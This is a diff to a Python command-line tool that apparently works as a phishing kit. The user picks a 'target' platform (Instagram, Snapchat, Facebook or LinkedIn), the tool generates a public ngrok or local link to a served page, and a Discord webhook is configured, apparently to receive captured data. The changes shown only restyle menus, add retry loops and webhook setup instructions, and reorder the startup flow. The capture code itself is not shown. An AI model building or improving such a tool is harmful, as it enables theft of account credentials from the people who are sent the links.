@@ -392,15 +392,15 @@ def print_menu():
         else:
             final_art.append(empty_line)
     
-    # Add menu options
+    # Add menu options with better formatting
     menu_options = [
         "[ Select your target ]",
         "",
-        "[1] Instagram",
-        "[2] Snapchat",
-        "[3] Facebook",
-        "[4] LinkedIn",
-        "[5] Exit",
+        colored("[1]", 'cyan') + " Instagram",
+        colored("[2]", 'cyan') + " Snapchat",
+        colored("[3]", 'cyan') + " Facebook",
+        colored("[4]", 'cyan') + " LinkedIn",
+        colored("[5]", 'cyan') + " Exit",
         "",
         "Enter your choice: "
     ]
@@ -408,7 +408,7 @@ def print_menu():
     # Add menu options with proper centering
     for option in menu_options[:-1]:
         padding = (frame_width - 2 - len(option)) // 2
-        final_line = colored('║', 'cyan') + ' ' * padding + colored(option, 'white') + ' ' * (frame_width - 2 - padding - len(option)) + colored('║', 'cyan')
+        final_line = colored('║', 'cyan') + ' ' * padding + option + ' ' * (frame_width - 2 - padding - len(option)) + colored('║', 'cyan')
         final_art.append(final_line)
     
     final_art.extend([
@@ -539,19 +539,25 @@ def serve_localhost(platform):
         return None
 
 def generate_link(platform):
-    print("\nChoose link generation method:")
-    print("[1] Ngrok")
-    print("[2] Localhost")
+    print("\n" + "=" * 60)
+    print(colored("Link Generation Method", 'yellow'))
+    print("=" * 60)
+    print("\nOptions:")
+    print(colored("[1]", 'cyan') + " Ngrok (Public URL)")
+    print(colored("[2]", 'cyan') + " Localhost (Local Network)")
+    print(colored("[3]", 'cyan') + " Back")
     
-    choice = input("Enter your choice: ").strip()
-    
-    if choice == '1':
-        return generate_ngrok(platform)
-    elif choice == '2':
-        return serve_localhost(platform)
-    else:
-        print("Invalid choice!")
-        return None
+    while True:
+        choice = input("\nEnter your choice: ").strip()
+        
+        if choice == '1':
+            return generate_ngrok(platform)
+        elif choice == '2':
+            return serve_localhost(platform)
+        elif choice == '3':
+            return None
+        else:
+            print(colored("\n× Invalid choice!", 'red'))
 
 def load_webhook():
     webhook_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'webhook.txt')
@@ -571,50 +577,71 @@ def setup_webhook():
     webhook = load_webhook()
     
     if webhook:
-        print("\nFound existing webhook URL")
-        print("Options:")
-        print("[1] Use existing webhook")
-        print("[2] Change webhook URL")
+        print("\n" + "=" * 60)
+        print(colored("Found existing webhook URL", 'yellow'))
+        print("=" * 60)
+        print("\nOptions:")
+        print(colored("[1]", 'cyan') + " Use existing webhook")
+        print(colored("[2]", 'cyan') + " Change webhook URL")
+        print(colored("[3]", 'cyan') + " Exit")
         
-        choice = input("\nEnter your choice: ").strip()
-        
-        if choice == '1':
-            print("✓ Using existing webhook URL")
-            return webhook
-        elif choice == '2':
-            print("\nEnter new Discord webhook URL:")
-            new_webhook = input().strip()
-            if new_webhook:
-                save_webhook(new_webhook)
-                print("✓ New webhook URL saved")
-                return new_webhook
-            else:
-                print("× No webhook URL provided")
+        while True:
+            choice = input("\nEnter your choice: ").strip()
+            
+            if choice == '1':
+                print(colored("\n✓ Using existing webhook URL", 'green'))
+                return webhook
+            elif choice == '2':
+                print("\n" + "=" * 60)
+                print(colored("Enter New Discord Webhook URL", 'yellow'))
+                print("=" * 60)
+                print("\n" + colored("Format:", 'cyan') + " https://discord.com/api/webhooks/...")
+                new_webhook = input("\nWebhook URL: ").strip()
+                if new_webhook:
+                    save_webhook(new_webhook)
+                    print(colored("\n✓ New webhook URL saved successfully", 'green'))
+                    return new_webhook
+                else:
+                    print(colored("\n× No webhook URL provided", 'red'))
+                    return None
+            elif choice == '3':
                 return None
-        else:
-            print("Invalid choice!")
-            return None
+            else:
+                print(colored("\n× Invalid choice!", 'red'))
     else:
-        print("\nNo webhook URL found")
-        print("Please enter your Discord webhook URL:")
-        webhook = input().strip()
+        print("\n" + "=" * 60)
+        print(colored("Discord Webhook Setup", 'yellow'))
+        print("=" * 60)
+        print("\n" + colored("Instructions:", 'cyan'))
+        print("1. Open Discord")
+        print("2. Go to Server Settings")
+        print("3. Select Integrations")
+        print("4. Create Webhook")
+        print("5. Copy Webhook URL")
+        print("\n" + colored("Format:", 'cyan') + " https://discord.com/api/webhooks/...")
+        
+        webhook = input("\nEnter your Discord webhook URL: ").strip()
         if webhook:
             save_webhook(webhook)
-            print("✓ Webhook URL saved")
+            print(colored("\n✓ Webhook URL saved successfully", 'green'))
             return webhook
         else:
-            print("× No webhook URL provided")
+            print(colored("\n× No webhook URL provided", 'red'))
             return None
 
 def main():
-    # Setup webhook first
-    webhook_url = setup_webhook()
-    if not webhook_url:
-        print("\nExiting... No webhook URL provided")
-        return
-
     while True:
-        choice = print_menu()
+        print_menu()  # Just show the menu first
+        
+        # Ask for webhook URL before platform selection
+        webhook_url = setup_webhook()
+        if not webhook_url:
+            print(colored("\nExiting... No webhook URL provided", 'red'))
+            return
+            
+        # Now get the platform choice
+        choice = input("\nEnter your choice: ").strip()
+        
         if choice == '1':
             generate_link('instagram')
         elif choice == '2':
@@ -624,7 +651,7 @@ def main():
         elif choice == '4':
             generate_link('linkedin')
         elif choice == '5':
-            print("\nExiting...")
+            print(colored("\nExiting...", 'yellow'))
             # Kill any running ngrok process
             if os.name == 'nt':
                 os.system('taskkill /f /im ngrok.exe 2>nul')
@@ -632,7 +659,8 @@ def main():
                 os.system('pkill ngrok')
             break
         else:
-            print("\nInvalid choice! Press Enter to continue...")
+            print(colored("\n× Invalid choice!", 'red'))
+            print(colored("Press Enter to continue...", 'yellow'))
             input()
         
         # Clear screen for Windows
